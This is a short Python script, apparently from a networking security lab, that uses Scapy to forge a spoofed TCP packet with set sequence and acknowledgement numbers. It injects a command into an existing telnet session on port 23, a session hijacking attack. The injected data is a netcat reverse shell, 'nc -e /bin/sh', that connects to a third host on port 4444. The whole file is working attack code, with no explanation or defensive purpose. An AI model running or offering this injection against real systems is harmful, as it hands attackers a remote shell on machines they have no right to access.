#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.190", dst = "10.10.10.188")
TCPLayer = TCP (sport=58470, dport=23, flags="A", seq=428434951, ack=2941347577)

data = "\n nc -e /bin/sh 10.10.10.189 4444 \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)
send(pkt,verbose=0)
